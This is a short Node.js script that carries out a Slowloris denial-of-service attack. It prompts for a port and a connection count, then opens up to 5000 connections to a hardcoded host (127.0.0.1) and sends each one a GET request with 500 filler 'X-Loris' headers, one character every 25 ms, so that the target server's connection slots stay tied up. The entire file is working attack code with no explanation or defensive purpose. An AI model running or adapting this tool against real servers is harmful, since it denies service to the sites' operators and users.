const net = require('net')
const readline = require('readline-promise').default

const client = new net.Socket()

const host = '127.0.0.1'

let lines = 500
let activeConnections = 0

const rlp = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: true
})

slowlorisAttack()

function printWhileSending() {
  setTimeout(() => {
    process.stdout.write('Sending headers')
    setInterval(() => {
      process.stdout.write('.');
    }, 250)
  }, 1000)
}

function slowlorisAttack() {
  rlp.questionAsync('Which port? ').then(p => {
    rlp.questionAsync('How many connections? ').then(c => {
      const port = p ? p : 3000
      const connections = c ? c : 5000
      req = createRequest()

      for(let i = 0; i < connections; i++) {
        sendRequest(req, port, (i == connections-1))
      }

      printWhileSending()
    })
  })
}

function createRequest() {
  let req = 'Host: ' + host + '\r\n' + 'Accept: */*\r\n'

  for(let i = 0; i < lines; i++) {
    req += 'X-Loris-' + i + ': ' + i + '\r\n'
  }

  req += '\r\n'

  return req
}

function sendRequest(req, port, finalReq) {
 const connection = net.connect(port, host, function(){
  activeConnections++
  console.log('Active connections: ' + activeConnections)

  connection.write('GET / HTTP/1.1\r\n')

  let i = 0;
  setInterval(function(){
    if (!req[i]) {
      return
    } else {
      connection.write(req[i])
      i++
      if (i == req.length && finalReq) {
        console.log('----Finished final request----')
        process.exit(0)
      }
    }
  }, 25)
})

 connection.setTimeout(0)

 connection.on('error', () => {
  activeConnections--
  if (activeConnections <= 0) {
    console.log('')
    console.log('----All connections closed-----')
    process.exit(0)
  }
})
}
